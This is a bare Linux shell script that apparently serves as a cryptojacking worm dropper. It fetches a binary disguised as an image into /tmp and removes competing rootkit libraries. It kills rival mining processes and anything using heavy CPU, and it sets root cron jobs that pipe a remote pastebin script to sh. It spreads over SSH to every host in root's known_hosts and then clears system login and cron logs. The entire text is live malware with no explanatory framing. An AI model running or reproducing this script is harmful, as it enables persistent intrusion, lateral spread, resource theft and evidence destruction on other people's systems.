export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

if [ ! -f "/tmp/busybox" ]; then
     (curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL http://1.z9ls.com/t6/701/1555229785x2890211768.jpg -o /tmp/busybox||wget --timeout=30 --tries=3 -q http://1.z9ls.com/t6/701/1555229785x2890211768.jpg -O /tmp/busybox||curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL https://pixeldrain.com/api/file/x4VZbyh2 -o /tmp/busybox||wget --timeout=30 --tries=3 -q https://pixeldrain.com/api/file/x4VZbyh2 -O /tmp/busybox) && chmod +x /tmp/busybox
fi
chattr -i /etc/ld.so.preload
/tmp/busybox rm -f /etc/ld.so.preload
/tmp/busybox rm -f /usr/local/lib/libioset.so
/tmp/busybox rm -f /usr/local/lib/libioset.c
/tmp/busybox rm -f /usr/local/lib/libcset.c
/tmp/busybox rm -f /usr/local/lib/libcset.so
/tmp/busybox rm -f /usr/local/lib/libcmoused.c
/tmp/busybox rm -f /usr/local/lib/libcmoused.so
/tmp/busybox rm -f /usr/local/lib/libcryptod.c
/tmp/busybox rm -f /usr/local/lib/libcryptod.so
/tmp/busybox rm -f /usr/local/lib/libpamcd.c
/tmp/busybox rm -f /usr/local/lib/libpamcd.so

ps -ef| grep -v grep | grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9
ps -ef| grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill -9
ps -ef| grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
ps -ef| grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill -9
ps -ef| grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill -9
ps -ef| grep -v grep | grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
ps -ef| grep -v grep | grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
ps -ef|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
ps -ef|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kworkerds" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "watchdogs" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kthrotlds" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "ksoftirqds" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kpsmouseds" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kintegrityds" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kerberods" | awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "khugepageds" | awk '{print $2}'|xargs kill -9
ps aux|grep -v grep|awk '{if($3>=50.0) print $2}'|xargs kill -9

if [ -e "/tmp/gates.lod" ]; then
    rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe)
    kill -9 $(cat /tmp/gates.lod)
    rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe)
    kill -9 $(cat /tmp/moni.lod)
    rm -rf /tmp/{gates,moni}.lod
fi

/tmp/busybox ps -ef | /tmp/busybox grep -v grep | /tmp/busybox egrep 'watchdogs' | /tmp/busybox awk '{print $1}' | /tmp/busybox xargs kill -9
/tmp/busybox ps -ef | /tmp/busybox grep -v grep | /tmp/busybox egrep 'kthrotlds' | /tmp/busybox awk '{print $1}' | /tmp/busybox xargs kill -9
/tmp/busybox ps -ef | /tmp/busybox grep -v grep | /tmp/busybox egrep 'ksoftirqds' | /tmp/busybox awk '{print $1}' | /tmp/busybox xargs kill -9
/tmp/busybox ps -ef | /tmp/busybox grep -v grep | /tmp/busybox egrep 'kpsmouseds' | /tmp/busybox awk '{print $1}' | /tmp/busybox xargs kill -9
/tmp/busybox ps -ef | /tmp/busybox grep -v grep | /tmp/busybox egrep 'kintegrityds' | /tmp/busybox awk '{print $1}' | /tmp/busybox xargs kill -9
/tmp/busybox ps -ef | /tmp/busybox grep -v grep | /tmp/busybox egrep 'kerberods' | /tmp/busybox awk '{print $1}' | /tmp/busybox xargs kill -9
/tmp/busybox ps -ef | /tmp/busybox grep -v grep | /tmp/busybox egrep 'khugepageds' | /tmp/busybox awk '{print $1}' | /tmp/busybox xargs kill -9

/tmp/busybox ps auxf | /tmp/busybox grep -v grep | /tmp/busybox egrep "watchdogs" | /tmp/busybox awk '{print $2}' | /tmp/busybox xargs kill -9
/tmp/busybox ps auxf | /tmp/busybox grep -v grep | /tmp/busybox egrep "kthrotlds" | /tmp/busybox awk '{print $2}' | /tmp/busybox xargs kill -9
/tmp/busybox ps auxf | /tmp/busybox grep -v grep | /tmp/busybox egrep "ksoftirqds" | /tmp/busybox awk '{print $2}' | /tmp/busybox xargs kill -9
/tmp/busybox ps auxf | /tmp/busybox grep -v grep | /tmp/busybox egrep 'kpsmouseds' | /tmp/busybox awk '{print $2}' | /tmp/busybox xargs kill -9
/tmp/busybox ps auxf | /tmp/busybox grep -v grep | /tmp/busybox egrep 'kintegrityds' | /tmp/busybox awk '{print $2}' | /tmp/busybox xargs kill -9
/tmp/busybox ps auxf | /tmp/busybox grep -v grep | /tmp/busybox egrep 'kerberods' | /tmp/busybox awk '{print $2}' | /tmp/busybox xargs kill -9
/tmp/busybox ps auxf | /tmp/busybox grep -v grep | /tmp/busybox egrep 'khugepageds' | /tmp/busybox awk '{print $2}' | /tmp/busybox xargs kill -9
/tmp/busybox pkill kthrotlds
/tmp/busybox pkill watchdogs
/tmp/busybox pkill kpsmouseds
/tmp/busybox pkill kintegrityds
/tmp/busybox pkill kerberods
/tmp/busybox pkill khugepageds
/tmp/busybox kill -9 $(cat /tmp/.lsdpid)
/tmp/busybox kill -9 $(cat /tmp/.ICEunix)
/tmp/busybox kill -9 $(cat /tmp/.X11unix)
/tmp/busybox rm -f /tmp/.lsdpid
/tmp/busybox rm -f /tmp/.iCEunix
/tmp/busybox rm -f /tmp/.X11unix
echo $(cat /tmp/.lsd)|awk '{print int($0)}'|xargs kill -9
echo $(cat /tmp/.lsd)|awk '{print int($0)-1}'|xargs kill -9
echo $(cat /tmp/.lsd)|awk '{print int($0)+1}'|xargs kill -9
echo $(cat /tmp/.lsd)|awk '{print int($0)+2}'|xargs kill -9

chattr -i /var/spool/cron/root
echo "*/10 * * * * (curl -fsSL https://pastebin.com/raw/v5XC0BJh||wget -q -O- https://pastebin.com/raw/v5XC0BJh)|sh" | crontab -
echo "*/10 * * * * (curl -fsSL https://pastebin.com/raw/v5XC0BJh||wget -q -O- https://pastebin.com/raw/v5XC0BJh)|sh" | sudo crontab -
chattr -i /etc/cron.d/root
echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/v5XC0BJh||wget -q -O- https://pastebin.com/raw/v5XC0BJh)|sh\n##" > /etc/cron.d/root
chattr -i /var/spool/cron/root
echo -e "*/15 * * * * (curl -fsSL https://pastebin.com/raw/v5XC0BJh||wget -q -O- https://pastebin.com/raw/v5XC0BJh)|sh\n##" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
chattr -i /var/spool/cron/crontabs/root
echo -e "*/15 * * * * (curl -fsSL https://pastebin.com/raw/v5XC0BJh||wget -q -O- https://pastebin.com/raw/v5XC0BJh)|sh\n##" > /var/spool/cron/crontabs/root

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/v5XC0BJh||wget -q -O- https://pastebin.com/raw/v5XC0BJh)|sh >/dev/null 2>&1 &' & done
fi

echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
#
